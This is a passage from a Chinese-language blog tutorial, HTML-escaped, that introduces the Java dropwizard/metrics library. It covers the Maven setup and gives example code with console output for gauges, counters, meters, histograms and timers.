>\n<li>&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#xFF1F;</li>\n<li>&#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7684;&#x65F6;&#x95F4;&#xFF1F;</li>\n</ul>\n<p>&#x57FA;&#x672C;&#x4E0A;&#x6BCF;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x3001;&#x5E94;&#x7528;&#x90FD;&#x9700;&#x8981;&#x505A;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x5C3D;&#x91CF;&#x4EE5;&#x5C11;&#x91CF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x7C7B;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x3002;</p>\n<p>&#x4EE5;Java&#x4E3A;&#x4F8B;&#xFF0C;&#x76EE;&#x524D;&#x6700;&#x4E3A;&#x6D41;&#x884C;&#x7684;metrics&#x5E93;&#x662F;&#x6765;&#x81EA;Coda Hale &#x7684; dropwizard/metrics&#xFF0C;&#x8BE5;&#x5E93;&#x88AB;&#x5E7F;&#x6CDB;&#x5730;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x4E2A;&#x77E5;&#x540D;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x4E2D;&#x3002;&#x4F8B;&#x5982; Hadoop&#xFF0C;Kafka&#xFF0C;Spark&#xFF0C;JStorm &#x4E2D;&#x3002;</p>\n<p>&#x672C;&#x6587;&#x5C31;&#x7ED3;&#x5408;&#x8303;&#x4F8B;&#x6765;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4E0B; dropwizard/metrics &#x7684;&#x6982;&#x5FF5;&#x548C;&#x7528;&#x6CD5;&#x3002;</p>\n<hr>\n<h3 id=\"Maven-&#x914D;&#x7F6E;\"><a href=\"#Maven-&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Maven &#x914D;&#x7F6E;\"></a>Maven &#x914D;&#x7F6E;</h3><p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;pom.xml&#x4E2D;&#x4F9D;&#x8D56; metrics-core &#x5305;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;io.dropwizard.metrics&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;metrics-core&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;<span class=\"variable\">${metrics.version}</span>&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong><em>&#x6CE8;&#xFF1A;&#x5728;POM&#x6587;&#x4EF6;&#x4E2D;&#x9700;&#x8981;&#x58F0;&#x660E; ${metrics.version} &#x7684;&#x5177;&#x4F53;&#x7248;&#x672C;&#x53F7;&#xFF0C;&#x5982; 3.1.0</em></strong></p>\n<hr>\n<h3 id=\"Metric-Registries\"><a href=\"#Metric-Registries\" class=\"headerlink\" title=\"Metric Registries\"></a>Metric Registries</h3><p>MetricRegistry&#x7C7B;&#x662F;Metrics&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x5B83;&#x662F;&#x5B58;&#x653E;&#x5E94;&#x7528;&#x4E2D;&#x6240;&#x6709;metrics&#x7684;&#x5BB9;&#x5668;&#x3002;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x4F7F;&#x7528; Metrics &#x5E93;&#x7684;&#x8D77;&#x70B9;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MetricRegistry registry = new MetricRegistry();</span><br></pre></td></tr></table></figure>\n<p>&#x6BCF;&#x4E00;&#x4E2A; metric &#x90FD;&#x6709;&#x5B83;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x540D;&#x5B57;&#xFF0C;Metrics &#x4E2D;&#x4F7F;&#x7528;&#x53E5;&#x70B9;&#x540D;&#x5B57;&#xFF0C;&#x5982; com.example.Queue.size&#x3002;&#x5F53;&#x4F60;&#x5728; com.example.Queue &#x4E0B;&#x6709;&#x4E24;&#x4E2A; metric &#x5B9E;&#x4F8B;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5730;&#x66F4;&#x5177;&#x4F53;&#xFF1A;com.example.Queue.requests.size &#x548C; com.example.Queue.response.size &#x3002;&#x4F7F;&#x7528;MetricRegistry&#x7C7B;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x5730;&#x751F;&#x6210;&#x540D;&#x5B57;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MetricRegistry.name(Queue.class, <span class=\"string\">&quot;requests&quot;</span>, <span class=\"string\">&quot;size&quot;</span>)</span><br><span class=\"line\">MetricRegistry.name(Queue.class, <span class=\"string\">&quot;responses&quot;</span>, <span class=\"string\">&quot;size&quot;</span>)</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"Metrics-&#x6570;&#x636E;&#x5C55;&#x793A;\"><a href=\"#Metrics-&#x6570;&#x636E;&#x5C55;&#x793A;\" class=\"headerlink\" title=\"Metrics &#x6570;&#x636E;&#x5C55;&#x793A;\"></a>Metrics &#x6570;&#x636E;&#x5C55;&#x793A;</h3><p>Metircs &#x63D0;&#x4F9B;&#x4E86; Report &#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x4E8E;&#x5C55;&#x793A; metrics &#x83B7;&#x53D6;&#x5230;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x3002;metrics-core&#x4E2D;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x56DB;&#x79CD; reporter&#xFF1A; JMX, console, SLF4J, &#x548C; CSV&#x3002; &#x5728;&#x672C;&#x6587;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528; ConsoleReporter &#x3002;</p>\n<hr>\n<h3 id=\"&#x4E94;&#x79CD;-Metrics-&#x7C7B;&#x578B;\"><a href=\"#&#x4E94;&#x79CD;-Metrics-&#x7C7B;&#x578B;\" class=\"headerlink\" title=\"&#x4E94;&#x79CD; Metrics &#x7C7B;&#x578B;\"></a>&#x4E94;&#x79CD; Metrics &#x7C7B;&#x578B;</h3><h4 id=\"Gauges\"><a href=\"#Gauges\" class=\"headerlink\" title=\"Gauges\"></a>Gauges</h4><p>&#x6700;&#x7B80;&#x5355;&#x7684;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x60F3;&#x8861;&#x91CF;&#x4E00;&#x4E2A;&#x5F85;&#x5904;&#x7406;&#x961F;&#x5217;&#x4E2D;&#x4EFB;&#x52A1;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GaugeTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Queue&lt;String&gt; q = new LinkedList&lt;String&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        registry.register(MetricRegistry.name(GaugeTest.class, <span class=\"string\">&quot;queue&quot;</span>, <span class=\"string\">&quot;size&quot;</span>), </span><br><span class=\"line\">        new Gauge&lt;Integer&gt;() {</span><br><span class=\"line\"></span><br><span class=\"line\">            public Integer <span class=\"function\"><span class=\"title\">getValue</span></span>() {</span><br><span class=\"line\">                <span class=\"built_in\">return</span> q.size();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        });</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">            q.add(<span class=\"string\">&quot;Job-xxx&quot;</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Gauges ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.GaugeTest.queue.size</span><br><span class=\"line\">             value = 6</span><br></pre></td></tr></table></figure></p>\n<p>&#x5176;&#x4E2D;&#x7B2C;7&#x884C;&#x548C;&#x7B2C;8&#x884C;&#x6DFB;&#x52A0;&#x4E86;ConsoleReporter&#xFF0C;&#x53EF;&#x4EE5;&#x6BCF;&#x79D2;&#x949F;&#x5C06;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#x6253;&#x5370;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#xFF0C;&#x7406;&#x89E3;&#x8D77;&#x6765;&#x4F1A;&#x66F4;&#x6E05;&#x695A;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x961F;&#x5217;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x60F3;&#x7B80;&#x5355;&#x5730;&#x8FD4;&#x56DE;queue.size()&#xFF0C;&#x56E0;&#x4E3A;java.util&#x548C;java.util.concurrent&#x4E2D;&#x5B9E;&#x73B0;&#x7684;#size()&#x65B9;&#x6CD5;&#x5F88;&#x591A;&#x90FD;&#x662F; O(n) &#x7684;&#x590D;&#x6742;&#x5EA6;&#xFF0C;&#x8FD9;&#x4F1A;&#x5F71;&#x54CD; Gauge &#x7684;&#x6027;&#x80FD;&#x3002;</p>\n<h4 id=\"Counters\"><a href=\"#Counters\" class=\"headerlink\" title=\"Counters\"></a>Counters</h4><p>Counter &#x5C31;&#x662F;&#x8BA1;&#x6570;&#x5668;&#xFF0C;Counter &#x53EA;&#x662F;&#x7528; Gauge &#x5C01;&#x88C5;&#x4E86; AtomicLong &#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5F97;&#x83B7;&#x5F97;&#x961F;&#x5217;&#x5927;&#x5C0F;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class CounterTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Queue&lt;String&gt; q = new LinkedBlockingQueue&lt;String&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Counter pendingJobs;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void addJob(String job) {</span><br><span class=\"line\">        pendingJobs.inc();</span><br><span class=\"line\">        q.offer(job);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String <span class=\"function\"><span class=\"title\">takeJob</span></span>() {</span><br><span class=\"line\">        pendingJobs.dec();</span><br><span class=\"line\">        <span class=\"built_in\">return</span> q.poll();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        pendingJobs = registry.counter(MetricRegistry.name(Queue.class,<span class=\"string\">&quot;pending-jobs&quot;</span>,<span class=\"string\">&quot;size&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        int num = 1;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(200);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (random.nextDouble() &gt; 0.7){</span><br><span class=\"line\">                String job = takeJob();</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;take job : &quot;</span>+job);</span><br><span class=\"line\">            }<span class=\"keyword\">else</span>{</span><br><span class=\"line\">                String job = <span class=\"string\">&quot;Job-&quot;</span>+num;</span><br><span class=\"line\">                addJob(job);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;add job : &quot;</span>+job);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            num++;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add job : Job-15</span><br><span class=\"line\">add job : Job-16</span><br><span class=\"line\">take job : Job-8</span><br><span class=\"line\">take job : Job-10</span><br><span class=\"line\">add job : Job-19</span><br><span class=\"line\">15-8-1 16:11:31 ============================================</span><br><span class=\"line\">-- Counters ----------------------------------------------</span><br><span class=\"line\">java.util.Queue.pending-jobs.size</span><br><span class=\"line\">             count = 5</span><br></pre></td></tr></table></figure>\n<h4 id=\"Meters\"><a href=\"#Meters\" class=\"headerlink\" title=\"Meters\"></a>Meters</h4><p>Meter&#x5EA6;&#x91CF;&#x4E00;&#x7CFB;&#x5217;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x7684;&#x901F;&#x7387;(rate)&#xFF0C;&#x4F8B;&#x5982;TPS&#x3002;Meters&#x4F1A;&#x7EDF;&#x8BA1;&#x6700;&#x8FD1;1&#x5206;&#x949F;&#xFF0C;5&#x5206;&#x949F;&#xFF0C;15&#x5206;&#x949F;&#xFF0C;&#x8FD8;&#x6709;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x7684;&#x901F;&#x7387;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MeterTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void request(Meter meter){</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">        meter.mark();</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void request(Meter meter, int n){</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(n &gt; 0){</span><br><span class=\"line\">            request(meter);</span><br><span class=\"line\">            n--;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,<span class=\"string\">&quot;request&quot;</span>,<span class=\"string\">&quot;tps&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            request(meterTps,random.nextInt(5));</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request</span><br><span class=\"line\">15-8-1 16:23:25 ============================================</span><br><span class=\"line\"></span><br><span class=\"line\">-- Meters ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.MeterTest.request.tps</span><br><span class=\"line\">             count = 134</span><br><span class=\"line\">         mean rate = 2.13 events/second</span><br><span class=\"line\">     1-minute rate = 2.52 events/second</span><br><span class=\"line\">     5-minute rate = 3.16 events/second</span><br><span class=\"line\">    15-minute rate = 3.32 events/second</span><br></pre></td></tr></table></figure>\n<p><strong><em>&#x6CE8;&#xFF1A;&#x975E;&#x5E38;&#x50CF; Unix &#x7CFB;&#x7EDF;&#x4E2D; uptime &#x548C; top &#x4E2D;&#x7684; load&#x3002;</em></strong></p>\n<h4 id=\"Histograms\"><a href=\"#Histograms\" class=\"headerlink\" title=\"Histograms\"></a>Histograms</h4><p>Histogram&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#x3002;&#x6BD4;&#x5982;&#x6700;&#x5C0F;&#x503C;&#xFF0C;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E2D;&#x95F4;&#x503C;&#xFF0C;&#x8FD8;&#x6709;&#x4E2D;&#x4F4D;&#x6570;&#xFF0C;75&#x767E;&#x5206;&#x4F4D;, 90&#x767E;&#x5206;&#x4F4D;, 95&#x767E;&#x5206;&#x4F4D;, 98&#x767E;&#x5206;&#x4F4D;, 99&#x767E;&#x5206;&#x4F4D;, &#x548C; 99.9&#x767E;&#x5206;&#x4F4D;&#x7684;&#x503C;(percentiles)&#x3002;</p>\n<p>&#x6BD4;&#x5982;request&#x7684;&#x5927;&#x5C0F;&#x7684;&#x5206;&#x5E03;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class HistogramTest {</span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir());</span><br><span class=\"line\">        registry.register(MetricRegistry.name(HistogramTest.class, <span class=\"string\">&quot;request&quot;</span>, <span class=\"string\">&quot;histogram&quot;</span>), histogram);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            Thread.sleep(1000);</span><br><span class=\"line\">            histogram.update(random.nextInt(100000));</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Histograms --------------------------------------------</span><br><span class=\"line\">java.util.Queue.queue.histogram</span><br><span class=\"line\">             count = 56</span><br><span class=\"line\">               min = 1122</span><br><span class=\"line\">               max = 99650</span><br><span class=\"line\">              mean = 48735.12</span><br><span class=\"line\">            stddev = 28609.02</span><br><span class=\"line\">            median = 49493.00</span><br><span class=\"line\">              75% &lt;= 72323.00</span><br><span class=\"line\">              95% &lt;= 90773.00</span><br><span class=\"line\">              98% &lt;= 94011.00</span><br><span class=\"line\">              99% &lt;= 99650.00</span><br><span class=\"line\">            99.9% &lt;= 99650.00</span><br></pre></td></tr></table></figure>\n<h4 id=\"Timers\"><a href=\"#Timers\" class=\"headerlink\" title=\"Timers\"></a>Timers</h4><p>Timer&#x5176;&#x5B9E;&#x662F; Histogram &#x548C; Meter &#x7684;&#x7ED3;&#x5408;&#xFF0C; histogram &#x67D0;&#x90E8;&#x5206;&#x4EE3;&#x7801;/&#x8C03;&#x7528;&#x7684;&#x8017;&#x65F6;&#xFF0C; meter&#x7EDF;&#x8BA1;TPS&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class TimerTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,<span class=\"string\">&quot;get-latency&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        Timer.Context ctx;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            ctx = timer.time();</span><br><span class=\"line\">            Thread.sleep(random.nextInt(1000));</span><br><span class=\"line\">            ctx.stop();</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Timers ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.TimerTest.get-latency</span><br><span class=\"line\">             count = 38</span><br><span class=\"line\">         mean rate = 1.90 calls/second</span><br><span class=\"line\">     1-minute rate = 1.66 calls/second</span><br><span class=\"line\">     5-minute rate = 1.61 calls/second</span><br><span class=\"line\">    15-minute rate = 1.60 calls/second</span><br><span class=\"line\">               min = 13.90 milliseconds</span><br><span class=\"line\">               max = 988.71 milliseconds</span><br><span class=\"line\">              mean = 519.21 milliseconds</span><br><span class=\"line\">            stddev = 286.23 milliseconds</span><br><span class=\"line\">            median = 553.84 milliseconds</span><br><span class=\"line\">              75% &lt;= 763.64 milliseconds</span><br><span class=\"line\">              95% &lt;= 943.27 milliseconds</span><br><span class=\"line\">              98% &lt;= 988.71 milliseconds</span><br><span class=\"line\">              99% &lt;= 988.71 milliseconds</span><br><span class=\"line\">            99.9% &lt;= 988.71 milliseconds</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h3><p>&#x521D;&#x6B21;&#x4E4B;&#x5916;&#xFF0C;Metrics&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;<a href=\"http://metrics.dropwizard.io/3.1.0/manual/healthchecks/\" target=\"_blank\" rel=\"external\">HealthCheck</a> 